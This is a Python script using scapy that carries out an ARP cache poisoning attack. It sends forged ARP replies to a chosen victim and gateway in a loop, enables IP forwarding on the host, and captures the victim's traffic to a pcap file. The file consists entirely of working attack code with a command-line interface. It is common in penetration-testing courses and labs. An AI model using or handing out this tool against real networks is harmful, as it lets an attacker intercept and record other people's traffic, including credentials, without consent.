from scapy.all import sniff, ARP, Ether, srp, send, wrpcap, conf, get_if_hwaddr, sndrcv
from multiprocessing import Process
import argparse,os, sys, time


class Target:
    """Represents a target for ARP cache poisoning attack"""

    ip_addr = None
    __mac_addr = None
    poisoned = None

    def __init__(self, ip) -> None:
        self.ip_addr = ip
        self.__mac_addr = self.get_mac()

    def __get_mac(self) -> str:
        packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=1, pdst=self.ip_addr)
        response, _ = srp(packet, timeout=2, retry=10, verbose=False)
        for _, r in response:
            return r[Ether].src
        return None

    def get_mac(self) -> str:
        if self.__mac_addr is None:
            self.__mac_addr = self.__get_mac()
        return self.__mac_addr


class Sniffer:
    """Class responsible for capturing packets"""

    iface = None
    sniff_filter = None
    count = None
    output_file = None

    def __init__(self, interface, count=100, sniff_filter=None, filename='captured.pcap') -> None:
        self.iface = interface
        self.sniff_filter = sniff_filter
        self.count = count
        self.output_file = filename

    def __process_packet(self, pkt) -> None:
        wrpcap(self.output_file, pkt, append=True)

    def start(self) -> None:
        print('Sniffing...')
        captured_packets = sniff(iface=self.iface, count=self.count,
                                filter=self.sniff_filter, prn=self.__process_packet)
        print(f"Sniffed packets saved in '{self.output_file}' file")


class ArpPoisoner:
    """Class to perform ARP cache poisoning (ARP Spoofing) attack"""

    interface = None
    victim = None
    gateway = None

    def __init__(self, interface, victim_ip, gateway_ip) -> None:
        self.victim = Target(victim_ip)
        self.gateway = Target(gateway_ip)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        # victim poisoning
        poison_victim = ARP()
        poison_victim.op = 2  # reply
        poison_victim.psrc = self.gateway.ip_addr
        poison_victim.pdst = self.victim.ip_addr
        poison_victim.hwdst = self.victim.get_mac()
        self.victim.poisoned = poison_victim

        # gateway poisoning
        poison_gateway = ARP()
        poison_gateway.op = 2 # reply
        poison_gateway.psrc = self.victim.ip_addr
        poison_gateway.pdst = self.gateway.ip_addr
        poison_gateway.hwdst = self.gateway.get_mac()
        self.gateway.poisoned = poison_gateway

    def poison(self, target: Target) -> None:
        """Sends malicious APR reply packet"""
        send(target.poisoned)


    def restore(self) -> None:
        """Restores targets' ARP caches"""
        # victim's ARP cache restore
        send(ARP(
            op=2,
            psrc=self.gateway.ip_addr,
            hwsrc=self.gateway.get_mac(),
            pdst=self.victim.ip_addr,
            hwdst='ff:ff:ff:ff:ff:ff'
        ), count=5)

        # gateway's ARP cache restore
        send(ARP(
            op=2,
            psrc=self.victim.ip_addr,
            hwsrc=self.victim.get_mac(),
            pdst=self.gateway.ip_addr,
            hwdst='ff:ff:ff:ff:ff:ff'
        ), count=5)

    def __change_routing(self, value: int) -> None:
        command = ''
        if sys.platform.startswith('linux'):
            command = f'echo {value} > /proc/sys/net/ipv4/ip_forward'
        elif sys.platform == 'darwin':
            command = f'sudo sysctl -w net.inet.ip.forwarding={value}'
        elif sys.platform == 'win32':
            oper = 'Enabled' if value == 1 else 'Disabled'
            command = 'powershell -Command Set-NetIPInterface -Forwarding ' + oper
        else:
            raise NotImplementedError('Unknown OS')
        os.system(command)

    def enable_routing(self) -> None:
        self.__change_routing(1)

    def disable_routing(self) -> None:
        self.__change_routing(0)

    def run(self) -> None:
        self.enable_routing()
        print('Poisoning...')

        try:
            while True:
                #sys.stdout.write('*')
                #sys.stdout.flush()
                self.poison(self.victim)
                self.poison(self.gateway)
                time.sleep(2)
        except KeyboardInterrupt:
            self.restore()
            self.disable_routing()
            return

    def __del__(self) -> None:
        self.disable_routing()

    def __str__(self) -> None:
        s = 'ARP cache poisoner:\n'
        s += f'Interface: {self.interface}\n'
        s += f'Gateway ({self.gateway.ip_addr}) has MAC: {self.gateway.get_mac()}\n'
        s += f'Victim ({self.victim.ip_addr}) has MAC: {self.victim.get_mac()}'
        return s


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='ARP cache poisoning attack')
    parser.add_argument('victim', help="victim's IPv4 address")
    parser.add_argument('-i', '--interface', required=True, help='network interface (ie. eth0)')
    parser.add_argument('-g', '--gateway', required=True, help="default gateway's IPv4 address")
    parser.add_argument('-c', '--count', default=100, help="number of packets to capture (default 100)", type=int)

    args = parser.parse_args(sys.argv[1:])

    poisoner = ArpPoisoner(args.interface, args.victim, args.gateway)
    print(poisoner)
    sniffer = Sniffer(
        poisoner.interface,
        sniff_filter=f"ip host {poisoner.victim.ip_addr}",
        count=args.count)
    poison_thread = Process(target=poisoner.run)
    poison_thread.start()
    sniffer.start()
    poison_thread.terminate()
    poisoner.restore()
